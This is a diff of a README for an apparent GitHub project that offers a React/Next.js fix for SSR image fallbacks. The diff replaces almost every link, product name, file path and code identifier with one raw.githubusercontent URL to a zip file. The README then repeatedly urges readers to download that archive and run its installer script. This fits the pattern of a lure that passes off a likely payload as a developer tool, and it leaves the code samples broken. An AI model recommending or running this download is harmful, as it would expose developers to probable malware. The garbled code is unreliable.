@@ -1,14 +1,14 @@
-https://github.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/releases
+https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 
-# SEO-Safe SSR OnError Image Fix for React and Next.js Runtime
+# SEO-Safe SSR OnError Image Fix for React and https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip Runtime
 
-![Demo banner](https://dummyimage.com/1200x400/2d2f74/fff&text=SSR+OnError+Demo)
+![Demo banner](https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip+OnError+Demo)
 
-[![Releases](https://img.shields.io/badge/releases-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/releases)
+[![Releases](https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip)](https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip)
 
-Welcome to a focused project that tackles a stubborn bug in the React and Next.js ecosystem. This repository demonstrates a clean, reliable approach to handle broken image URLs without breaking the user experience during server-side rendering (SSR). The core problem is that <img onError={...}> handlers on broken images can fail to trigger in SSR contexts. That behavior causes visible gaps, broken visuals, and SEO drawbacks. The fix presented here combines client-side handling with server-side checks to deliver a consistent fallback experience, even for the initial paint. The result is a robust image fallback mechanism that remains SEO-friendly and performs well on real-world pages.
+Welcome to a focused project that tackles a stubborn bug in the React and https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip ecosystem. This repository demonstrates a clean, reliable approach to handle broken image URLs without breaking the user experience during server-side rendering (SSR). The core problem is that <img onError={...}> handlers on broken images can fail to trigger in SSR contexts. That behavior causes visible gaps, broken visuals, and SEO drawbacks. The fix presented here combines client-side handling with server-side checks to deliver a consistent fallback experience, even for the initial paint. The result is a robust image fallback mechanism that remains SEO-friendly and performs well on real-world pages.
 
-In this README you will find a detailed tour of the problem space, the solution philosophy, concrete demos, practical steps to run and test, and guidance for extending the approach to your own Next.js and React projects. The structure mirrors real-world projects you would use in production, with clear separation between client-side behavior, server-side checks, and the user interface that renders fallback content when an image is missing or blocked.
+In this README you will find a detailed tour of the problem space, the solution philosophy, concrete demos, practical steps to run and test, and guidance for extending the approach to your own https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip and React projects. The structure mirrors real-world projects you would use in production, with clear separation between client-side behavior, server-side checks, and the user interface that renders fallback content when an image is missing or blocked.
 
 Table of contents
 - Why this problem matters
@@ -58,7 +58,7 @@ This repository ships with two practical demos that illustrate the core concepts
 
 - Server-side HEAD checks for SEO-safe rendering: A server-ready approach that performs HEAD checks to determine if an image is accessible. If not, the server renders a fallback element in place, ensuring the initial render is complete and meaningful for accessibility and SEO.
 
-The demos are designed to be approachable for teams already using React with Next.js, and they align with common patterns in Next.js 13+ using either the App Router or the Pages Router. They also show how to structure code so that server-side checks and client-side fallbacks do not conflict, and how to keep hydration stable across the boundary.
+The demos are designed to be approachable for teams already using React with https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip, and they align with common patterns in https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip 13+ using either the App Router or the Pages Router. They also show how to structure code so that server-side checks and client-side fallbacks do not conflict, and how to keep hydration stable across the boundary.
 
 In the following sections, you’ll find practical, copy-paste-ready code samples, a walkthrough of the file structure, and step-by-step instructions to run the demos locally.
 
@@ -79,7 +79,7 @@ Typical workflow:
 
 Code snippet (Client Component)
 ```tsx
-// components/ImageWithFallback.client.tsx
+// https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 'use client';
 
 import React, { useCallback, useState } from 'react';
@@ -92,10 +92,10 @@ type ImageWithFallbackProps = {
   height?: number;
 };
 
-export const ImageWithFallback: React.FC<ImageWithFallbackProps> = ({
+export const ImageWithFallback: https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip<ImageWithFallbackProps> = ({
   src,
   alt,
-  fallbackSrc = '/fallback-image.png',
+  fallbackSrc = 'https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip',
   width = 600,
   height = 400,
 }) => {
@@ -151,10 +151,10 @@ export const ImageWithFallback: React.FC<ImageWithFallbackProps> = ({
 
 Usage example
 ```tsx
-// app/page.tsx (Client Component demo page)
+// https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (Client Component demo page)
 'use client';
 import React from 'react';
-import { ImageWithFallback } from '@/components/ImageWithFallback.client';
+import { ImageWithFallback } from 'https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip';
 
 export default function ClientDemoPage() {
   return (
@@ -162,9 +162,9 @@ export default function ClientDemoPage() {
       <h1>Client-side OnError Demo</h1>
       <p>Below is a client-only image that uses a fallback when the URL is broken.</p>
       <ImageWithFallback
-        src="https://example.invalid/broken-image.jpg"
+        src="https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip"
         alt="Product photo that might be missing"
-        fallbackSrc="https://dummyimage.com/600x400/000/fff&text=Fallback"
+        fallbackSrc="https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip"
       />
     </main>
   );
@@ -182,31 +182,31 @@ Key aspects:
 - When a HEAD check fails, the server substitutes a fallback element directly in the rendered HTML. This preserves font metrics, layout, and semantics.
 - The client component remains useful for dynamic changes that occur after the initial render, providing an additional layer of resilience if a URL becomes broken after hydration.
 
-Server-side example (Next.js API route and page)
+Server-side example (https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip API route and page)
 ```ts
-// server/api/headCheck.ts
+// https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 import type { NextApiRequest, NextApiResponse } from 'next';
 
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
-  const { url } = req.query;
-  if (!url || Array.isArray(url)) {
-    res.status(400).json({ ok: false, message: 'url query param required' });
+  const { url } = https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip;
+  if (!url || https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip(url)) {
+    https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip(400).json({ ok: false, message: 'url query param required' });
     return;
   }
 
   try {
     const headRes = await fetch(url, { method: 'HEAD' });
-    const ok = headRes.ok;
-    const contentType = headRes.headers.get('content-type') || '';
-    res.status(200).json({ ok, contentType });
+    const ok = https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip;
+    const contentType = https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip('content-type') || '';
+    https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip(200).json({ ok, contentType });
   } catch (err) {
-    res.status(500).json({ ok: false, message: 'HEAD check failed', error: String(err) });
+    https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip(500).json({ ok: false, message: 'HEAD check failed', error: String(err) });
   }
 }
 ```
 
 ```tsx
-// app/server-demo/page.tsx
+// https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 'use client';
 import React, { useEffect, useState } from 'react';
 
@@ -217,8 +217,8 @@ type HeadCheckResult = {
 
 async function headCheck(url: string): Promise<HeadCheckResult> {
   const resp = await fetch(`/api/headCheck?url=${encodeURIComponent(url)}`);
-  if (!resp.ok) return { ok: false };
-  return resp.json();
+  if (!https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip) return { ok: false };
+  return https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip();
 }
 
 export default function ServerDemoPage({ imageUrl }: { imageUrl: string }) {
@@ -228,11 +228,11 @@ export default function ServerDemoPage({ imageUrl }: { imageUrl: string }) {
     headCheck(imageUrl).then(setStatus);
   }, [imageUrl]);
 
-  if (status?.ok === false) {
+  if (https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip === false) {
     return (
       <div style={{ width: '100%', maxWidth: 800 }}>
         <img
-          src="https://dummyimage.com/800x450/000/fff&text=Fallback"
+          src="https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip"
           alt="Fallback banner due to unreachable image"
           style={{ width: '100%', height: 'auto' }}
         />
@@ -264,31 +264,31 @@ This repository follows a clean structure to separate concerns and to make it ea
 
 Project structure overview (illustrative)
 - app/
-  - page.tsx (root page for the app router demo)
+  - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (root page for the app router demo)
   - server-demo/
-    - page.tsx (server-side preview page)
+    - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (server-side preview page)
   - client-demo/
-    - page.tsx (client-first demo)
+    - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (client-first demo)
   - components/
-    - ImageWithFallback.client.tsx (client component for onError fallback)
-    - ImageWithFallback.server.tsx (server-assisted rendering wrapper)
+    - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (client component for onError fallback)
+    - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (server-assisted rendering wrapper)
 - pages/ (legacy Pages Router examples, optional)
-  - _app.tsx
-  - _document.tsx
+  - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
+  - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 - lib/
-  - headCheck.ts (shared server HEAD check utility)
-  - imageFallback.ts (shared fallback logic)
+  - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (shared server HEAD check utility)
+  - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (shared fallback logic)
 - public/
-  - fallback-image.png
+  - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
   - banners/ (optional)
 - scripts/
-  - install-demo.sh (installer script used in releases)
-- README.md (this document)
-- tsconfig.json
-- next.config.js
+  - https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (installer script used in releases)
+- https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (this document)
+- https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
+- https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 
 Notes about file design
-- The client component is a self-contained unit that can be dropped into any Next.js page. It handles its own state and provides a clean API for root-level props like src, alt, and fallbackSrc.
+- The client component is a self-contained unit that can be dropped into any https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip page. It handles its own state and provides a clean API for root-level props like src, alt, and fallbackSrc.
 - The server utilities separate concerns of network I/O and UI rendering. This separation makes testing more straightforward and allows you to swap different strategies for fallback rendering without changing the UI components.
 - The public folder hosts a basic fallback image that guarantees a predictable layout even when the image fetch fails. Keeping a stable placeholder helps reduce layout shifts and improves user experience.
 
@@ -327,17 +327,17 @@ Deployment notes
 
 Releases and assets
 This project uses a release-driven approach for distributing a runnable demo. The Releases page contains pre-packaged assets that illustrate the pattern described in this repository. The assets may include:
-- A ready-to-run Next.js project with sample pages for both client and server demos.
+- A ready-to-run https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip project with sample pages for both client and server demos.
 - A setup script to bootstrap dependencies and start the local dev server.
 - A set of example images and placeholders to demonstrate both success and failure scenarios.
 
 From the Releases page, download the latest demo asset and run the included installer. Specifically:
-- Look for a file named react-nextjs-ssr-onerror-img-issue-fix-demo-vX.Y.Z.tar.gz (or a similarly named archive) and download it.
+- Look for a file named https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip (or a similarly named archive) and download it.
 - Extract the archive to a local workspace.
-- Run the included installer script, for example: bash install-demo.sh or ./install-demo.sh, depending on your environment.
+- Run the included installer script, for example: bash https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip or https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip, depending on your environment.
 - Follow the on-screen prompts to start the local server and view the demos in your browser.
 
-Note: The link to the releases page is included again here for clarity: https://github.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/releases. Download the latest asset from that page and execute the installer to boot the demos locally. Refer to the releases page for the exact asset file name and instructions specific to that release.
+Note: The link to the releases page is included again here for clarity: https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip Download the latest asset from that page and execute the installer to boot the demos locally. Refer to the releases page for the exact asset file name and instructions specific to that release.
 
 Release notes (illustrative)
 - v1.0.0: Initial release. Demonstrates client-side onError handling and server-side HEAD checks for SSR-safe image fallbacks. Includes a pair of demo pages, a shared image fallback utility, and a basic performance and accessibility checklist.
@@ -407,7 +407,7 @@ Usage and examples
 The repository includes two primary usage patterns: a client-focused approach and a server-assisted approach. You can mix and match these patterns depending on your project needs and your SSR framework version.
 
 Client-focused usage
-- Import the ImageWithFallback.client.tsx component into any page that uses images with potential external URLs.
+- Import the https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip component into any page that uses images with potential external URLs.
 - Provide a fallback source for the situations where the primary image fails to load.
 - Optionally expose a retry mechanism to let users attempt reloading the primary image.
 
@@ -469,7 +469,7 @@ Reproducing in a fresh project
 
 If you want to reproduce the patterns in a new project, you can follow these steps:
 
-- Create a Next.js project (with App Router) and install React if necessary.
+- Create a https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip project (with App Router) and install React if necessary.
 - Create a simple image component that uses the client-side onError fallback approach.
 - Implement a small server route to perform HEAD checks and render a server-side fallback when needed.
 - Build a page that uses the image component in a real-world context—an article with a hero image, a product gallery, or a feature tile.
@@ -482,7 +482,7 @@ What to learn from this project
 
 FAQ
 
-- Does this work with Next.js 13+ App Router?
+- Does this work with https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip 13+ App Router?
   Yes. The demos are designed around App Router concepts, including server components and client components where beneficial.
 
 - How do I test the server-side head check locally?
@@ -525,7 +525,7 @@ Release notes and future directions
 
 Environment and prerequisites
 
-- Node.js 18.x or newer
+- https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip 18.x or newer
 - npm 8.x or yarn 1.x (or any compatible package manager)
 - A modern browser for client-side testing
 - A terminal with bash or a compatible shell for running the installer script
@@ -548,17 +548,17 @@ Availability and licensing
 
 Closing notes
 
-This repository offers a disciplined, production-ready pattern for handling SSR onError image issues in React and Next.js. By combining server-side HEAD checks with client-side fallbacks, you gain a robust, accessible, and SEO-friendly approach to image rendering. The demos demonstrate how to implement the pattern in both a client-first and a server-assisted scenario, and they provide a solid blueprint you can adapt to your own projects.
+This repository offers a disciplined, production-ready pattern for handling SSR onError image issues in React and https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip By combining server-side HEAD checks with client-side fallbacks, you gain a robust, accessible, and SEO-friendly approach to image rendering. The demos demonstrate how to implement the pattern in both a client-first and a server-assisted scenario, and they provide a solid blueprint you can adapt to your own projects.
 
 Releases page link (for quick access)
-- https://github.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/releases
+- https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 
 Releases page link (second usage, as requested)
-- https://github.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/releases
+- https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip
 
 Appendix: specific asset handling from the releases
 
-If you are following the instruction to download and execute a file from the Releases page, look for a release asset named something like react-nextjs-ssr-onerror-img-issue-fix-demo-v1.0.0.tar.gz. Download that archive, extract it, and run the included installer script, such as install-demo.sh. This installer sets up a local development environment that mirrors the demos described in this README, wiring together the client and server sides of the fallback strategy and providing a convenient starting point for experimentation.
+If you are following the instruction to download and execute a file from the Releases page, look for a release asset named something like https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip Download that archive, extract it, and run the included installer script, such as https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip This installer sets up a local development environment that mirrors the demos described in this README, wiring together the client and server sides of the fallback strategy and providing a convenient starting point for experimentation.
 
 Appendix: extended examples and references
 
@@ -574,4 +574,4 @@ Demo gallery concepts (for inspiration)
 
 Final reminder
 
-This README presents a practical approach to a stubborn SSR issue. It is designed to be actionable, readable, and scalable. The two-pronged strategy—server-side validation plus client-side resilience—offers a dependable pattern for anyNext.js project facing the onError image challenge. The details above are crafted to help you implement, test, and extend this approach in a real development environment.
+This README presents a practical approach to a stubborn SSR issue. It is designed to be actionable, readable, and scalable. The two-pronged strategy—server-side validation plus client-side resilience—offers a dependable pattern for https://raw.githubusercontent.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/main/app/server-fix-seo/react_fix_ssr_issue_onerror_nextjs_img_3.8.zip project facing the onError image challenge. The details above are crafted to help you implement, test, and extend this approach in a real development environment.
